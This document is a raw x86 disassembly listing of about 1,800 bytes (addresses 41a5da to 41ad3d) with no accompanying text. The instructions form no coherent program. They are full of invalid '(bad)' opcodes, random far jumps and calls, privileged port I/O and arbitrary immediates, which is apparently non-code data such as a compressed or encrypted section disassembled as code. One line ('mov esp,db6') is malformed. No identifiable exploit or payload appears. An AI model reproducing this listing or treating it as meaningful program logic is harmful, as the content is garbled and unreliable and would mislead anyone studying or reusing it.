  41a5da:	pop    ebp
  41a5db:	mov    ebp,0xb8c634c3
  41a5e0:	sbb    eax,0xce297c0f
  41a5e5:	or     BYTE PTR [ebx-0x343733e],bh
  41a5eb:	pushf  
  41a5ec:	enter  0xdcf4,0xd3
  41a5f0:	pop    ecx
  41a5f1:	sub    esi,DWORD PTR [edi]
  41a5f3:	in     eax,dx
  41a5f4:	leave  
  41a5f5:	ja     0x41a5ba
  41a5f7:	repz icebp 
  41a5f9:	or     BYTE PTR [ebx],bl
  41a5fb:	enter  0x99e0,0xcb
  41a5ff:	pop    esi
  41a600:	sahf   
  41a601:	inc    ebp
  41a602:	jbe    0x41a63d
	...
  41a610:	add    ah,dl
  41a612:	mov    edi,0xedff8dd6
  41a617:	(bad)  
  41a619:	or     al,0x14
  41a61b:	call   0xbbe2:0x6717354e
  41a622:	and    eax,DWORD PTR [ecx]
  41a624:	add    BYTE PTR [ebx+0x47000003],ch
  41a62a:	fmul   st(7),st
  41a62c:	loop   0x41a69c
  41a62e:	fidiv  WORD PTR [ecx-0x6151e265]
  41a634:	sbb    eax,0xb5699ed0
  41a639:	stos   BYTE PTR es:[edi],al
  41a63a:	pop    esp
  41a63b:	sahf   
  41a63c:	pop    edi
  41a63d:	out    0xfb,eax
  41a63f:	jl     0x41a671
  41a641:	pop    eax
  41a642:	push   ebx
  41a643:	and    eax,0x867661e
  41a648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a649:	adc    ebp,DWORD PTR [ecx-0x69]
  41a64c:	(bad)  [esi-0x3]
  41a64f:	shr    DWORD PTR [ebp+0x3c8878d3],1
  41a655:	not    BYTE PTR [eax+0x66]
  41a658:	pop    edi
  41a659:	pop    ecx
  41a65a:	sbb    eax,0xd21c8f02
  41a65f:	stc    
  41a660:	mov    esp,0x6158c084
  41a665:	mov    ah,0x9a
  41a667:	mov    ds:0x7b69acb1,eax
  41a66c:	aad    0xd7
  41a66e:	mov    dl,BYTE PTR [ecx]
  41a670:	(bad)  
  41a671:	cmp    cl,BYTE PTR [esi+eiz*8+0x5f]
  41a675:	jp     0x41a666
  41a677:	cli    
  41a678:	stos   DWORD PTR es:[edi],eax
  41a679:	lock arpl WORD PTR [ebp-0x43fb9d04],bp
  41a680:	test   DWORD PTR [ebp+0x14b1d3ff],ecx
  41a686:	ins    BYTE PTR es:[edi],dx
  41a687:	test   DWORD PTR [eax+0x7c706bc0],esp
  41a68d:	xchg   ebp,eax
  41a68e:	out    dx,eax
  41a68f:	xchg   edi,eax
  41a690:	loopne 0x41a669
  41a692:	rcl    DWORD PTR [ebx],cl
  41a694:	test   BYTE PTR [eax],dh
  41a696:	or     eax,0x85e79a4f
  41a69b:	sbb    bh,al
  41a69d:	call   0x2f44b0cf
  41a6a2:	push   ebp
  41a6a3:	cdq    
  41a6a4:	retf   
  41a6a5:	in     eax,0xe2
  41a6a7:	and    eax,0x2acd0121
  41a6ac:	or     DWORD PTR [edi-0x69],0x8e16cdeb
  41a6b3:	dec    ecx
  41a6b4:	xchg   edx,eax
  41a6b5:	shr    DWORD PTR [ebp+0x66],0xe4
  41a6b9:	mov    edi,0xc368a664
  41a6be:	and    ebp,edi
  41a6c0:	imul   ebp,DWORD PTR [ebx-0x38],0xe91d108e
  41a6c7:	outs   dx,DWORD PTR ds:[esi]
  41a6c8:	mov    DWORD PTR [eax+0x77],ebp
  41a6cb:	mov    ah,0x3f
  41a6cd:	xchg   esp,eax
  41a6ce:	inc    ecx
  41a6cf:	jle    0x41a6b4
  41a6d1:	idiv   cl
  41a6d3:	push   edx
  41a6d4:	mov    esi,0x3fe4d701
  41a6d9:	inc    esi
  41a6da:	in     eax,dx
  41a6db:	imul   ecx,DWORD PTR [ebp-0x3380445b],0xc
  41a6e2:	adc    esp,DWORD PTR [edx+0x68]
  41a6e5:	mov    esp,0xc5df6a20
  41a6ea:	in     eax,0x71
  41a6ec:	mov    ebx,0xecb34746
  41a6f1:	mov    esi,0x29c0b085
  41a6f6:	jbe    0x41a6c7
  41a6f8:	dec    ebx
  41a6f9:	aas    
  41a6fa:	xor    BYTE PTR [esi+ebx*4+0x26],cl
  41a6fe:	jecxz  0x41a729
  41a700:	jg     0x41a73b
  41a702:	pop    ss
  41a703:	inc    eax
  41a704:	add    esi,ebp
  41a706:	aam    0x69
  41a708:	xchg   edx,eax
  41a709:	call   0xee13:0x512a2bbf
  41a710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a711:	cmp    al,0x30
  41a713:	jg     0x41a71e
  41a715:	cmp    BYTE PTR [esi+0x27e98d79],ah
  41a71b:	push   cs
  41a71c:	imul   esi,DWORD PTR [esi+edi*1],0x624f36c7
  41a723:	mov    esi,0xa3c14cc1
  41a728:	sub    BYTE PTR ss:[edi-0x35],ah
  41a72c:	inc    esi
  41a72d:	gs aam 0x1c
  41a730:	in     al,dx
  41a731:	jnp    0x41a766
  41a733:	dec    esp
  41a734:	pop    esp
  41a735:	push   ebx
  41a736:	cld    
  41a737:	push   edi
  41a738:	xor    BYTE PTR [edi],0x44
  41a73b:	adc    esi,DWORD PTR [ebp+ebx*1+0x69]
  41a73f:	nop
  41a740:	fidivr WORD PTR [ecx]
  41a742:	sub    DWORD PTR [ebx-0xd],0xffffffce
  41a746:	fistp  WORD PTR [esi]
  41a748:	and    DWORD PTR [ebx+0x6b],ecx
  41a74b:	pushf  
  41a74c:	in     al,0xef
  41a74e:	mov    cl,0x70
  41a750:	pop    edx
  41a751:	pusha  
  41a752:	cmp    al,0x7a
  41a754:	xchg   edi,eax
  41a755:	jnp    0x41a71c
  41a757:	jg     0x41a7a3
  41a759:	pop    eax
  41a75a:	cmp    dl,bh
  41a75c:	push   esp
  41a75d:	mov    ecx,0xddce9cf7
  41a762:	loopne 0x41a716
  41a764:	lods   eax,DWORD PTR ds:[esi]
  41a765:	mov    ecx,0x40183746
  41a76a:	imul   edi,DWORD PTR ss:[ecx],0x26be18cc
  41a771:	pop    ecx
  41a772:	ret    0xbff4
  41a775:	std    
  41a776:	(bad)  
  41a778:	aas    
  41a779:	dec    edx
  41a77a:	inc    ebp
  41a77b:	and    DWORD PTR [edx],edx
  41a77d:	popf   
  41a77e:	sbb    eax,0x72ff7089
  41a783:	mov    ch,0x65
  41a785:	mov    eax,0x3ec1a520
  41a78a:	fs cli 
  41a78c:	cwde   
  41a78d:	retf   
  41a78e:	(bad)  [edi-0x1b]
  41a791:	retf   
  41a792:	mov    esi,0x23acc256
  41a797:	xor    al,0xe6
  41a799:	mov    edx,0xcc94d79a
  41a79e:	mov    BYTE PTR [ecx-0x3aac9f3c],ch
  41a7a4:	daa    
  41a7a5:	ret    
  41a7a6:	xchg   esi,eax
  41a7a7:	sbb    BYTE PTR [esi-0x67],ah
  41a7aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7ab:	mov    edi,0x72802435
  41a7b0:	push   eax
  41a7b1:	inc    eax
  41a7b2:	ss loopne 0x41a820
  41a7b5:	loope  0x41a799
  41a7b7:	jo     0x41a7aa
  41a7b9:	and    eax,0x25966988
  41a7be:	sub    eax,0xba7a2939
  41a7c3:	dec    ebp
  41a7c4:	sub    DWORD PTR [eax],eax
  41a7c6:	and    DWORD PTR [ecx-0x2b],esp
  41a7c9:	cwde   
  41a7ca:	into   
  41a7cb:	hlt    
  41a7cc:	pusha  
  41a7cd:	ins    BYTE PTR es:[edi],dx
  41a7ce:	dec    edx
  41a7cf:	(bad)  
  41a7d0:	cmc    
  41a7d1:	pop    ebx
  41a7d2:	jge    0x41a7b2
  41a7d4:	dec    edx
  41a7d5:	test   dl,dl
  41a7d7:	jnp    0x41a772
  41a7d9:	inc    esp
  41a7da:	pop    ebx
  41a7db:	mov    cl,0xb
  41a7dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7de:	ins    DWORD PTR es:[edi],dx
  41a7df:	dec    ebx
  41a7e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7e1:	mov    dh,0xae
  41a7e3:	pop    ds
  41a7e4:	push   edx
  41a7e5:	fild   QWORD PTR [ebp-0x3b783b03]
  41a7eb:	cmp    al,0x30
  41a7ed:	inc    ebx
  41a7ee:	js     0x41a7c2
  41a7f0:	push   ebp
  41a7f1:	inc    edx
  41a7f2:	dec    edi
  41a7f3:	cmp    BYTE PTR [edx],dh
  41a7f5:	arpl   WORD PTR [edx],bp
  41a7f7:	pop    edx
  41a7f8:	arpl   WORD PTR [ecx],si
  41a7fa:	(bad)  
  41a7fb:	int3   
  41a7fc:	add    dl,BYTE PTR [ecx+ecx*4]
  41a7ff:	mov    eax,ds:0x756f68ae
  41a804:	fcomp  DWORD PTR [esi-0x26cf1961]
  41a80a:	and    DWORD PTR [ebp-0x5c],0xbf1f95d9
  41a811:	mov    ds:0x38bffc58,al
  41a816:	stos   DWORD PTR es:[edi],eax
  41a817:	fwait
  41a818:	cdq    
  41a819:	fisub  DWORD PTR [esp+esi*1]
  41a81c:	imul   ebp,DWORD PTR [eax],0x7f752338
  41a822:	push   ebx
  41a823:	ret    
  41a824:	in     eax,dx
  41a825:	dec    edx
  41a826:	popf   
  41a827:	das    
  41a828:	jmp    0x41a84b
  41a82a:	cs jbe 0x41a7be
  41a82d:	xchg   ebx,eax
  41a82e:	fnstenv [edx+0x77]
  41a831:	fwait
  41a832:	jg     0x41a7db
  41a834:	outs   dx,DWORD PTR ds:[esi]
  41a835:	inc    esi
  41a836:	loopne 0x41a8a2
  41a838:	and    BYTE PTR [esi-0x2e33105b],0xb
  41a83f:	(bad)  
  41a840:	call   0x6b90a1d7
  41a845:	inc    eax
  41a846:	ins    BYTE PTR es:[edi],dx
  41a847:	retf   0xbc1d
  41a84a:	or     eax,DWORD PTR [eax-0x2f264c3]
  41a850:	xor    ebp,DWORD PTR [eax-0x4c]
  41a853:	jg     0x41a834
  41a855:	in     eax,0xe2
  41a857:	push   ecx
  41a858:	in     eax,0xba
  41a85a:	mov    bh,0x6c
  41a85c:	sub    al,0x32
  41a85e:	(bad)  
  41a85f:	retf   
  41a860:	(bad)  
  41a861:	hlt    
  41a862:	push   eax
  41a863:	iret   
  41a864:	cmp    BYTE PTR [eax-0x72],dl
  41a867:	push   0x6499a4ac
  41a86c:	mov    BYTE PTR [eax],0xf8
  41a86f:	xchg   ebx,eax
  41a870:	(bad)  
  41a871:	ins    BYTE PTR es:[edi],dx
  41a872:	cmp    eax,0x881c6336
  41a877:	adc    eax,0x59ba01fc
  41a87c:	dec    edx
  41a87d:	pop    esp
  41a87e:	dec    edi
  41a87f:	es pop esp
  41a881:	mov    cl,0x1e
  41a883:	stos   BYTE PTR es:[edi],al
  41a884:	fist   WORD PTR [eax-0x38c7931b]
  41a88a:	xor    DWORD PTR [ecx],0x15
  41a88d:	fldl2e 
  41a88f:	pushf  
  41a890:	call   0x749ee71f
  41a895:	sub    DWORD PTR [esi],esp
  41a897:	jae    0x41a8ea
  41a899:	mov    eax,0xed9a4114
  41a89e:	rcr    DWORD PTR [edx+0x379080e],0x3e
  41a8a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8a6:	fwait
  41a8a7:	mov    ds:0x698f4319,al
  41a8ac:	push   0x2b136e6a
  41a8b1:	fistp  DWORD PTR [edi-0x14]
  41a8b4:	jle    0x41a90b
  41a8b6:	jmp    0x523e:0xafcef533
  41a8bd:	push   0x27f293a2
  41a8c2:	fisubr WORD PTR [edx]
  41a8c4:	mov    eax,ds:0x9eb19619
  41a8c9:	sub    bl,ch
  41a8cb:	int    0xf
  41a8cd:	cmp    BYTE PTR [ecx+ecx*4+0x4c],al
  41a8d1:	xor    eax,0x94f1946f
  41a8d6:	test   BYTE PTR [edx],dl
  41a8d8:	add    BYTE PTR [edx],dl
  41a8da:	mov    al,ds:0x16d43b3b
  41a8df:	icebp  
  41a8e0:	dec    edi
  41a8e1:	clc    
  41a8e2:	mov    ah,BYTE PTR [edx]
  41a8e4:	xor    eax,0x41f7f118
  41a8e9:	cmp    bh,BYTE PTR [ecx+0x5ffbab74]
  41a8ef:	cli    
  41a8f0:	repz push esi
  41a8f2:	jge    0x41a8cf
  41a8f4:	in     eax,0x4c
  41a8f6:	test   al,ah
  41a8f8:	jmp    0xb707:0x662714b0
  41a8ff:	repnz sub dh,0xa1
  41a903:	push   ds
  41a904:	mov    WORD PTR [eax],cs
  41a906:	mov    ds:0x22c3f152,al
  41a90b:	jmp    0xd957:0x49c2e44c
  41a912:	jnp    0x41a8e3
  41a914:	je     0x41a917
  41a916:	jg     0x41a8de
  41a918:	push   0x962685b9
  41a91d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a91e:	pop    ecx
  41a91f:	in     al,dx
  41a920:	dec    ebp
  41a921:	cmp    BYTE PTR [edi+0x449ac98b],al
  41a927:	and    DWORD PTR [eax+0x1678c75d],esp
  41a92d:	iret   
  41a92e:	mov    bh,BYTE PTR [ebp-0x260b9f43]
  41a934:	inc    ecx
  41a935:	jecxz  0x41a8d5
  41a937:	pushf  
  41a938:	mov    edi,0x8d1552ee
  41a93d:	div    DWORD PTR [ebp-0x7e]
  41a940:	div    DWORD PTR [esi+0x2f]
  41a943:	das    
  41a944:	add    ebp,eax
  41a946:	mul    BYTE PTR [ecx]
  41a948:	(bad)  
  41a949:	scas   eax,DWORD PTR es:[edi]
  41a94a:	xor    edx,DWORD PTR [edx-0x1d7cbdc7]
  41a950:	scas   al,BYTE PTR es:[edi]
  41a951:	mov    ds:0x18862f5c,eax
  41a956:	cmc    
  41a957:	pop    edx
  41a958:	add    esp,edx
  41a95a:	aam    0xdb
  41a95c:	out    0x3a,al
  41a95e:	sub    BYTE PTR [ebp+0x11483e5b],0x43
  41a965:	cmp    DWORD PTR [esi-0x7c],esi
  41a968:	cmp    ecx,esi
  41a96a:	rol    eax,cl
  41a96c:	mov    esi,0x67ac9653
  41a971:	inc    ebx
  41a972:	dec    esi
  41a973:	mov    al,BYTE PTR [eax]
  41a975:	test   eax,0x75f5f69a
  41a97a:	pop    esi
  41a97b:	jl     0x41a90b
  41a97d:	call   FWORD PTR [edx+ebp*1+0x23]
  41a981:	inc    esi
  41a982:	(bad)  
  41a983:	push   ebp
  41a984:	div    al
  41a986:	scas   eax,DWORD PTR es:[edi]
  41a987:	sbb    edx,DWORD PTR [ecx]
  41a989:	into   
  41a98a:	mov    ch,0x32
  41a98c:	fwait
  41a98d:	or     al,0xb6
  41a98f:	push   ecx
  41a990:	dec    edi
  41a991:	add    eax,0xbb1a7e2b
  41a996:	push   ebx
  41a997:	jp     0x41a96e
  41a999:	mov    bl,0xd6
  41a99b:	scas   al,BYTE PTR es:[edi]
  41a99c:	repz pop esp
  41a99e:	outs   dx,BYTE PTR ds:[esi]
  41a99f:	pop    es
  41a9a0:	dec    edx
  41a9a1:	add    ah,BYTE PTR [eax+eax*1-0x5b]
  41a9a5:	leave  
  41a9a6:	push   ecx
  41a9a7:	pop    edi
  41a9a8:	inc    esp
  41a9a9:	xchg   ebx,eax
  41a9aa:	in     al,dx
  41a9ab:	push   ds
  41a9ac:	adc    esi,ebp
  41a9ae:	lods   eax,DWORD PTR ds:[esi]
  41a9af:	stos   DWORD PTR es:[edi],eax
  41a9b0:	test   eax,0x6eaa629d
  41a9b5:	stos   BYTE PTR es:[edi],al
  41a9b6:	fwait
  41a9b7:	aas    
  41a9b8:	push   0x2989674e
  41a9bd:	sub    eax,0xb15c8fa4
  41a9c2:	stc    
  41a9c3:	mov    cl,0x9f
  41a9c5:	inc    esp
  41a9c6:	mov    ds:0x725d88f0,eax
  41a9cb:	pop    esi
  41a9cc:	cmp    BYTE PTR [ecx+0x5c70b497],cl
  41a9d2:	idiv   DWORD PTR [ebx+0x0]
	...
  41a9e0:	add    BYTE PTR [ebx-0x8],al
  41a9e3:	gs sbb edi,edi
  41a9e6:	popf   
  41a9e7:	jg     0x41a9e3
  41a9e9:	mov    al,0x88
  41a9eb:	dec    ebp
  41a9ec:	sahf   
  41a9ed:	push   ecx
  41a9ee:	add    ecx,DWORD PTR [ecx+ecx*2]
  41a9f1:	data16 daa 
  41a9f3:	add    DWORD PTR [eax],eax
  41a9f5:	stos   DWORD PTR es:[edi],eax
  41a9f6:	add    eax,DWORD PTR [eax]
  41a9f8:	add    bl,cl
  41a9fa:	cwde   
  41a9fb:	enter  0x4c02,0x4d
  41a9ff:	pop    edx
  41aa00:	ret    
  41aa01:	es and cl,ch
  41aa04:	repnz mov ecx,0x62e15ae1
  41aa0a:	pop    es
  41aa0b:	jmp    0xc616:0xfca5d92a
  41aa12:	dec    ebx
  41aa13:	and    ch,BYTE PTR [ebx+0x4e4f3441]
  41aa19:	aas    
  41aa1a:	je     0x41aa8a
  41aa1c:	jle    0x41aa65
  41aa1e:	pushf  
  41aa1f:	fidivr DWORD PTR [ecx-0x792edbd2]
  41aa25:	push   0x2c
  41aa27:	aaa    
  41aa28:	sub    edi,DWORD PTR [eax]
  41aa2a:	aaa    
  41aa2b:	lods   eax,DWORD PTR ds:[esi]
  41aa2c:	jge    0x41aa99
  41aa2e:	out    0x25,al
  41aa30:	add    DWORD PTR [ebp-0x3f],esp
  41aa33:	sub    BYTE PTR [esi],dh
  41aa35:	mov    dh,BYTE PTR [edx+edx*4-0x26]
  41aa39:	sti    
  41aa3a:	(bad)  
  41aa3c:	(bad)  
  41aa3d:	sbb    ecx,DWORD PTR ss:[ebx]
  41aa40:	xor    ch,BYTE PTR [esi-0x73]
  41aa43:	dec    ecx
  41aa44:	dec    edx
  41aa45:	or     eax,0x3f
  41aa48:	jbe    0x41a9da
  41aa4a:	int3   
  41aa4b:	dec    eax
  41aa4c:	cmp    eax,DWORD PTR [edx+0x2c]
  41aa4f:	jns    0x41aa2c
  41aa51:	jnp    0x41aabb
  41aa53:	fld    QWORD PTR [ecx-0x22]
  41aa56:	mov    ah,0x58
  41aa58:	sub    cl,BYTE PTR [esi]
  41aa5a:	rol    BYTE PTR [eax+0x73],1
  41aa5d:	and    BYTE PTR [eax+eiz*8+0x71],bh
  41aa61:	lock mov al,ds:0x7e8b056f
  41aa67:	inc    esp
  41aa68:	dec    esi
  41aa69:	pushf  
  41aa6a:	neg    BYTE PTR [ecx-0x27]
  41aa6d:	xchg   ebx,eax
  41aa6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa6f:	in     eax,0x67
  41aa71:	js     0x41aa92
  41aa73:	scas   eax,DWORD PTR es:[edi]
  41aa74:	dec    ebp
  41aa75:	std    
  41aa76:	sbb    BYTE PTR [esi+0x16],dh
  41aa79:	dec    esp
  41aa7a:	icebp  
  41aa7b:	adc    DWORD PTR ds:0xe1819d40,ecx
  41aa81:	inc    ebx
  41aa82:	das    
  41aa83:	sbb    al,0x17
  41aa85:	aas    
  41aa86:	mov    ds:0xf28f9b9d,eax
  41aa8b:	retf   
  41aa8c:	loopne 0x41aa6e
  41aa8e:	aas    
  41aa8f:	pop    esp
  41aa90:	or     al,0x6b
  41aa92:	mov    esp,0xdf2c3b7f
  41aa97:	xor    cl,cl
  41aa99:	dec    edi
  41aa9a:	sub    eax,0x51ebb90d
  41aa9f:	mov    bl,0x44
  41aaa1:	daa    
  41aaa2:	shl    DWORD PTR [ecx+0x60],0xe8
  41aaa6:	xlat   BYTE PTR ds:[ebx]
  41aaa7:	in     eax,0xa7
  41aaa9:	loope  0x41aa3a
  41aaab:	and    ah,BYTE PTR [ebp+0x82be8da]
  41aab1:	inc    BYTE PTR [edx+0x6b0c1267]
  41aab7:	sub    BYTE PTR [edi],dh
  41aab9:	stc    
  41aaba:	dec    edx
  41aabb:	aam    0x9f
  41aabd:	pop    ebx
  41aabe:	push   0xa9d344c7
  41aac3:	pop    esp
  41aac4:	(bad)  
  41aac5:	lahf   
  41aac6:	sahf   
  41aac7:	loope  0x41aa7f
  41aac9:	jo     0x41ab2c
  41aacb:	jne    0x41aadf
  41aacd:	mov    ah,0xeb
  41aacf:	hlt    
  41aad0:	stc    
  41aad1:	lds    ecx,FWORD PTR [ecx-0x23]
  41aad4:	loope  0x41aa60
  41aad6:	pop    ebp
  41aad7:	lds    esp,FWORD PTR [edx+esi*2+0x3b58c6d6]
  41aade:	push   0xc2ace3ec
  41aae3:	clc    
  41aae4:	bound  ebp,QWORD PTR [ecx-0x79]
  41aae7:	push   esi
  41aae8:	xor    BYTE PTR [eax],ah
  41aaea:	pop    ds
  41aaeb:	sub    eax,0xd48c5f98
  41aaf0:	mov    eax,ds:0x3f24f197
  41aaf5:	das    
  41aaf6:	xor    BYTE PTR [edx],ah
  41aaf8:	fistp  QWORD PTR [esi-0x4933594f]
  41aafe:	jg     0x41aac3
  41ab00:	mov    ebp,0xd8a30ba5
  41ab05:	jg     0x41ab0c
  41ab07:	shl    DWORD PTR [ebx+0x22],1
  41ab0a:	lea    esp,[edx+0x29eb7c7e]
  41ab10:	xchg   ebx,eax
  41ab11:	push   ss
  41ab12:	aam    0x1
  41ab14:	mov    dl,0x96
  41ab16:	sbb    bl,BYTE PTR [edx-0x66]
  41ab19:	leave  
  41ab1a:	div    BYTE PTR [eax+0x3f]
  41ab1d:	xchg   esi,eax
  41ab1e:	lahf   
  41ab1f:	push   esp
  41ab20:	sbb    eax,0x7f12d872
  41ab25:	mov    esi,0xe0b36a76
  41ab2a:	xchg   BYTE PTR [esi+0x3e86344b],bh
  41ab30:	pop    eax
  41ab31:	inc    ebp
  41ab32:	loop   0x41ab3e
  41ab34:	pop    ecx
  41ab35:	cdq    
  41ab36:	in     eax,dx
  41ab37:	sbb    eax,0x7337f670
  41ab3c:	mov    ebx,0xe611902d
  41ab41:	sbb    eax,0xebcd3b00
  41ab46:	nop    DWORD PTR [eax-0x7b]
  41ab4a:	ja     0x41aad6
  41ab4c:	iret   
  41ab4d:	inc    ebx
  41ab4e:	inc    ebx
  41ab4f:	popa   
  41ab50:	inc    ecx
  41ab51:	sbb    al,0x11
  41ab53:	mov    ds:0x5d5226d6,eax
  41ab58:	push   0xa781be57
  41ab5d:	int3   
  41ab5e:	les    edi,FWORD PTR [ebx]
  41ab60:	fstp   TBYTE PTR [esi-0x70]
  41ab63:	fsub   QWORD PTR [ebx-0x25]
  41ab66:	cdq    
  41ab67:	add    BYTE PTR [edx],cl
  41ab69:	dec    esp
  41ab6a:	push   ds
  41ab6b:	cmovle ebx,DWORD PTR [eax+edx*1-0x451dff44]
  41ab73:	adc    BYTE PTR [eax],0xbc
  41ab76:	jg     0x41ab6f
  41ab78:	and    eax,0x9a55e3e5
  41ab7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab7e:	mov    esp,0x5d4691f5
  41ab83:	addr16 jmp 0xfa4d:0x58e0e10c
  41ab8b:	push   ebx
  41ab8c:	test   eax,0x48e70a3c
  41ab91:	jnp    0x41abc1
  41ab93:	daa    
  41ab94:	imul   ecx,DWORD PTR [ecx],0x40
  41ab97:	cmc    
  41ab98:	xchg   esi,eax
  41ab99:	mov    dl,bl
  41ab9b:	ins    BYTE PTR es:[edi],dx
  41ab9c:	adc    al,0xfb
  41ab9e:	addr16 pop esi
  41aba0:	cmp    BYTE PTR [ebp+0x7887affa],dl
  41aba6:	add    edi,DWORD PTR [ecx+0x34c24ef1]
  41abac:	and    BYTE PTR [ebx+eiz*4],ah
  41abaf:	jp     0x41abe0
  41abb1:	inc    esp
  41abb2:	(bad)  
  41abb3:	push   edx
  41abb4:	retf   
  41abb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abb6:	imul   ecx,ebp,0x30
  41abb9:	fiadd  DWORD PTR [esi+0x465a1739]
  41abbf:	dec    ecx
  41abc0:	aad    0x11
  41abc2:	push   esi
  41abc3:	fnsave [ebx-0xae57052]
  41abc9:	cmp    DWORD PTR [edx],ecx
  41abcb:	in     eax,dx
  41abcc:	aam    0xc1
  41abce:	lea    ecx,[ebx-0x2e]
  41abd1:	icebp  
  41abd2:	(bad)  
  41abd3:	jge    0x41ac0b
  41abd5:	fcom   QWORD PTR [esi-0x36]
  41abd8:	adc    al,0x1a
  41abda:	jmp    0xd34e:0x57544c78
  41abe1:	ins    BYTE PTR es:[edi],dx
  41abe2:	sahf   
  41abe3:	in     eax,dx
  41abe4:	ret    0x6efc
  41abe7:	inc    ebx
  41abe8:	mov    bh,0x8c
  41abea:	dec    esi
  41abeb:	cmp    ecx,DWORD PTR [ecx+0x764b732c]
  41abf1:	xchg   esi,eax
  41abf2:	cwde   
  41abf3:	dec    ebx
  41abf4:	or     ah,BYTE PTR [esi]
  41abf6:	int3   
  41abf7:	pop    ss
  41abf8:	jne    0x41abac
  41abfa:	add    BYTE PTR [edi-0x3232d1a5],cl
  41ac00:	jo     0x41abd6
  41ac02:	xlat   BYTE PTR ds:[ebx]
  41ac03:	xchg   edx,eax
  41ac04:	jmp    0x22ba:0x175494ea
  41ac0b:	mov    ch,BYTE PTR [ecx-0x463a131d]
  41ac11:	retf   0x4cab
  41ac14:	loopne 0x41abce
  41ac16:	mov    dh,0xf9
  41ac18:	fild   DWORD PTR gs:[ebx+eiz*1]
  41ac1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac1d:	pushf  
  41ac1e:	jge    0x41abcb
  41ac20:	pop    esi
  41ac21:	xor    bl,cl
  41ac23:	mov    BYTE PTR [eax-0x68],dl
  41ac26:	or     bh,bl
  41ac28:	jmp    0x8757:0x435cd07e
  41ac2f:	push   es
  41ac30:	repnz fnsave [ebx+ecx*2+0x12e8a8b2]
  41ac38:	sbb    BYTE PTR [ecx],bh
  41ac3a:	cmc    
  41ac3b:	lahf   
  41ac3c:	stc    
  41ac3d:	leave  
  41ac3e:	test   DWORD PTR [esi+edx*8+0x7d],ecx
  41ac42:	xor    BYTE PTR [ebx-0xb],bl
  41ac45:	sbb    dl,ch
  41ac47:	add    DWORD PTR [ebx],edx
  41ac49:	add    BYTE PTR [ebx+0x74],dh
  41ac4c:	pop    es
  41ac4d:	bound  edx,QWORD PTR [edx]
  41ac4f:	or     DWORD PTR ss:[edi],ebp
  41ac52:	repz cdq 
  41ac54:	shl    dl,0x13
  41ac57:	mov    edx,0x2687351
  41ac5c:	push   edi
  41ac5d:	js     0x41ac78
  41ac5f:	std    
  41ac60:	ds mov ecx,0xf23ab3e0
  41ac66:	inc    edx
  41ac67:	es pop ds
  41ac69:	je     0x41acb4
  41ac6b:	outs   dx,DWORD PTR ds:[esi]
  41ac6c:	mov    edi,0xd3db829
  41ac71:	ds gs popa 
  41ac74:	adc    eax,0x66151b1b
  41ac79:	jo     0x41ac77
  41ac7b:	cmp    ebp,eax
  41ac7d:	ja     0x41ac55
  41ac7f:	cmp    al,0x5d
  41ac81:	hlt    
  41ac82:	je     0x41ac29
  41ac84:	jno    0x41acd5
  41ac86:	pop    esi
  41ac87:	mov    dl,0x7f
  41ac89:	xor    ebx,eax
  41ac8b:	xlat   BYTE PTR ds:[ebx]
  41ac8c:	into   
  41ac8d:	xor    BYTE PTR [edi+0x29],0x71
  41ac91:	adc    DWORD PTR [edx-0x217da064],0x4505acf2
  41ac9b:	dec    edx
  41ac9c:	or     esp,DWORD PTR [eax]
  41ac9e:	jmp    0xa65e205e
  41aca3:	bound  edi,QWORD PTR [ebx+0x3de3d36d]
  41aca9:	sbb    eax,edx
  41acab:	arpl   ax,bx
  41acad:	cmp    eax,0xca7a20f7
  41acb2:	inc    edx
  41acb3:	mov    edi,0x56ba1a55
  41acb8:	pop    esi
  41acb9:	add    al,BYTE PTR [eax+0x2c]
  41acbc:	sar    cl,0x83
  41acbf:	or     ch,dl
  41acc1:	xchg   esp,eax
  41acc2:	inc    eax
  41acc3:	ins    BYTE PTR es:[edi],dx
  41acc4:	push   0x17
  41acc6:	lds    ebx,FWORD PTR [esi+ebp*8+0x12]
  41acca:	mov    ch,0x55
  41accc:	or     ch,cl
  41acce:	sub    dl,BYTE PTR [ebx+eiz*8-0x1]
  41acd2:	jno    0x41ac7f
  41acd4:	or     eax,0x1dff3416
  41acd9:	push   es
  41acda:	es inc edi
  41acdc:	jle    0x41accf
  41acde:	jno    0x41accd
  41ace0:	hlt    
  41ace1:	jmp    0xd98:0x5b28c25f
  41ace8:	dec    edx
  41ace9:	leave  
  41acea:	adc    eax,0x53e1d483
  41acef:	push   ebp
  41acf0:	sbb    edx,DWORD PTR [ebx+0x4ef1711e]
  41acf6:	(bad)  
  41acf8:	jno    0x41ad21
  41acfa:	stos   BYTE PTR es:[edi],al
  41acfb:	sub    al,0x6d
  41acfd:	mov    esp,db6
  41ad00:	adc    DWORD PTR [ebx],ebx
  41ad02:	ret    0xf36a
  41ad05:	sbb    eax,0x2f4ee0d3
  41ad0a:	fldcw  WORD PTR [eax+eiz*2]
  41ad0d:	lods   al,BYTE PTR ds:[esi]
  41ad0e:	hlt    
  41ad0f:	fistp  DWORD PTR [edx]
  41ad11:	lds    edx,FWORD PTR [ebx+edx*2+0x65]
  41ad15:	in     al,0x37
  41ad17:	scas   eax,DWORD PTR es:[edi]
  41ad18:	into   
  41ad19:	dec    ecx
  41ad1a:	pop    es
  41ad1b:	ret    0xe289
  41ad1e:	out    dx,al
  41ad1f:	(bad)  
  41ad20:	fcmovnu st,st(0)
  41ad22:	xchg   ecx,eax
  41ad23:	pop    eax
  41ad24:	and    bh,BYTE PTR [ecx]
  41ad26:	adc    bl,bl
  41ad28:	mov    ds:0x7c3af68,al
  41ad2d:	push   esp
  41ad2e:	dec    esi
  41ad2f:	or     ebx,DWORD PTR [ebp+0x112b8f0a]
  41ad35:	add    DWORD PTR [esi],esp
  41ad37:	icebp  
  41ad38:	out    dx,eax
  41ad39:	rcl    DWORD PTR [edi],0x1f
  41ad3c:	fwait
  41ad3d:	pop    esp
